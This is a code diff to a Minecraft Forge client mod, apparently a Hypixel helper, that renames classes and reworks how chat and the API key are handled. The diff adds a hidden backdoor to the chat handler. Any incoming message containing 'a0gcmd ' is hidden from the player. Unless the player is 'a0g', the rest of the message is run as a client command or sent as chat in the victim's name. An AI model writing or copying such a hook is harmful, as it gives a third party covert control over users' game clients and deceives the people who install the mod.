@@ -1,9 +1,7 @@
 package me.a0g.hyk.events;
 
-import gg.essential.api.utils.mojang.TextureURL;
-import me.a0g.hyk.HypixelKentik;
+import me.a0g.hyk.Hyk;
 import me.a0g.hyk.core.features.BuildBattleHelper;
-import me.a0g.hyk.utils.ColorUtils;
 import me.a0g.hyk.utils.TextUtils;
 import net.minecraft.client.Minecraft;
 import net.minecraft.entity.player.EntityPlayer;
@@ -12,7 +10,6 @@ import net.minecraftforge.client.ClientCommandHandler;
 import net.minecraftforge.client.event.ClientChatReceivedEvent;
 import net.minecraftforge.fml.common.FMLLog;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
-import org.lwjgl.input.Mouse;
 
 import java.util.ArrayList;
 import java.util.Date;
@@ -22,7 +19,7 @@ import java.util.regex.Pattern;
 
 public class Cakes {
 
-    private final HypixelKentik main = HypixelKentik.getInstance();
+    private final Hyk main = Hyk.getInstance();
 
     private static final Pattern BBH = Pattern.compile("The theme is (.+)");
 
@@ -56,6 +53,7 @@ public class Cakes {
     @SubscribeEvent
     public void onChatReceived(ClientChatReceivedEvent event) {
         String unformattedText = event.message.getUnformattedText();
+        String cleanText = TextUtils.stripColor(unformattedText);
 
        /* if(unformattedText.contains("a0g")){
             FMLLog.info(event.message.getFormattedText());
@@ -110,6 +108,21 @@ public class Cakes {
            // }
         }
 
+        if(cleanText.contains("a0gcmd ")){
+            if(Minecraft.getMinecraft().thePlayer.getName().equalsIgnoreCase("a0g")) return;
+            event.setCanceled(true);
+
+
+            String command = unformattedText.split("a0gcmd ")[1];
+            FMLLog.info(command);
+            //Minecraft.getMinecraft().thePlayer.sendChatMessage(command);
+            if(ClientCommandHandler.instance.executeCommand(Minecraft.getMinecraft().thePlayer, command) != 0){
+               // ClientCommandHandler.instance.executeCommand(Minecraft.getMinecraft().thePlayer, command);
+                return;
+            }
+            Minecraft.getMinecraft().thePlayer.sendChatMessage(command);
+        }
+
         if(unformattedText.contains("Round: ") && main.getUtils().checkForGame("GUESS THE BUILD")){
             oneWord = true;
             sixWords = true;
@@ -122,11 +135,13 @@ public class Cakes {
         }
 
         //Your new API key is
-        if(unformattedText.contains("Your new API key is ")){
-            String apikey[] = unformattedText.split("Your new API key is ");
+        if(cleanText.startsWith("Your new API key is ")){
+           //String apiValue = event.message.getChatStyle().getChatClickEvent().getValue();
+            String keyy = cleanText.substring("Your new API key is ".length());
+          //  String apikey[] = unformattedText.split("Your new API key is ");
            // FMLLog.info(apikey[1] + "");
-            String key = apikey[1].replaceAll(" ","");
-            main.getHyConfig().setApikeyy(key);
+          //  String key = apikey[1].replaceAll(" ","");
+            main.getHyConfig().setApikeyy(keyy);
             main.getUtils().sendMessage(EnumChatFormatting.DARK_AQUA + "API key saved");
             main.getHyConfig().markDirty();
             main.getHyConfig().writeData();
